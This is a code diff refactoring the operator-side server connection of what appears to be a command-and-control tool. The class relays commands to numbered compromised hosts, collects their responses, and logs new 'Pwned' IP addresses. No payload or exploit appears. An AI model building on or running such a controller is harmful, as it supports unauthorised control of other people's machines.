@@ -1,6 +1,6 @@
 const EventEmitter = require('events');
 const { packet_types } = require('../protocol/protocol');
-const { serializePacket, parsePacket, createPacket: _createPacket } = require('../protocol/packet');
+const { createPacket } = require('../protocol/packet');
 const { PacketConnection } = require('../protocol/connection');
 
 
@@ -9,44 +9,58 @@ class Server extends EventEmitter {
         super();
         this.connection = new PacketConnection(socket);
         this.connection.on('packet', (data) => {
-            try {
-                let packet = parsePacket('control', 'response', data);
-                this.handleResponse(packet);
-            } catch (err) {
-                console.error(err);
-            }
+            this.handleResponse(JSON.parse(data.toString()));
         });
         socket.on('close', () => {
             console.log('Connection to host closed.');
         });
-        Server.connectedServer = this;
+        Server.connectedServer = this; //TODO: this sucks
     }
 
+    /**
+     * Close server connection.
+     */
     close() {
         this.connection.socket.destroy();
     }
 
-    handleResponse(packet) {
-        if (typeof packet === 'string' && packet == 'abort') {
-            let abortPkt = _createPacket('host', 'response', 'retcode');
-            abortPkt.retcode = -999;
-            this.emit('hostpacket', abortPkt);
-            return;
-        }
+    /**
+     * Abort any command currently waiting for a host response
+     */
+    abort() {
+        let abortPkt = createPacket('host', 'response', 'retcode');
+        abortPkt.retcode = -999;
+        this.emit('hostpacket', abortPkt);
+    }
 
-        if (packet._ptype.name == 'newpwn') {
-            console.log(`\n[!] Pwned ${packet.ip}`);
-        }
-        if (packet._ptype.name == 'hostresponse') {
-            this.emit('hostpacket', parsePacket('host', 'response', packet.data));
+    /**
+     * Handle response packets from server
+     * @param {*} packet
+     */
+    handleResponse(packet) {
+        switch (packet['_ptype'].name) {
+            case 'servererror':
+                console.log(`ERROR: Server encountered error (${packet.message})`);
+                this.abort();
+                break;
+            case 'newpwn':
+                console.log(`\n[!] Pwned ${packet.ip}`);
+                break;
+            case 'hostresponse':
+                this.emit('hostpacket', packet.data);
+                break;
+            default:
+                //TODO: handle invalid packet type
+                break;
         }
     }
 
     /**
+     * Alias to create host command packet.
      * @param {string} name 
      */
-    createPacket(name) {
-        return _createPacket('host', 'command', name);
+    commandPacket(name) {
+        return createPacket('host', 'command', name);
     }
 
     /**
@@ -54,23 +68,21 @@ class Server extends EventEmitter {
      * @param {*} response
      */
     /** 
-     * @param {*} packet 
+     * Sends packet as a command to a given host.
+     * 
+     * The passed-in callback co-handles any packets that arrive during the command,
+     * and it is deregistered once a retcode is received. If it is null, out and err
+     * packets are handled automatically.
+     * 
+     * @param {number} hostID
+     * @param {*} packet
      * @param {hostCmdCallback} callback 
-     * @returns 
+     * @returns {number} retcode from host
      */
-    async sendHostCommand(packet, callback) {
-        let type = null;
-        for (let pkt of packet_types.control.command.values()) {
-            if (pkt.name == 'relaycommand') {
-                type = pkt;
-                break;
-            }
-        }
-        let wrappedPkt = {
-            _ptype: type,
-            id: 0, // TODO: fill in host id
-            command: serializePacket('host', 'command', packet),
-        };
+    async sendCommandToHost(hostID, packet, callback) {
+        let wrappedPkt = createPacket('control', 'command', 'relaycommand');
+        wrappedPkt.id = hostID;
+        wrappedPkt.command = packet;
         
         return new Promise((resolve) => {
             let handler = (responsePkt) => {
@@ -94,9 +106,24 @@ class Server extends EventEmitter {
         });
     }
 
+    /** 
+     * Sends packet to the currently selected host.
+     * See `sendCommandToHost()` for more details.
+     * 
+     * @param {*} packet
+     * @param {hostCmdCallback} callback 
+     * @returns {number} retcode from host
+     */
+    async sendHostCommand(packet, callback) {
+        await this.sendCommandToHost(0, packet, callback);
+    }
+
+    /**
+     * Send packet to this server.
+     * @param {*} packet
+     */
     sendCommand(packet) {
-        let buf = serializePacket('control', 'command', packet);
-        this.connection.write(buf);
+        this.connection.write(JSON.stringify(packet));
     }
 }
 
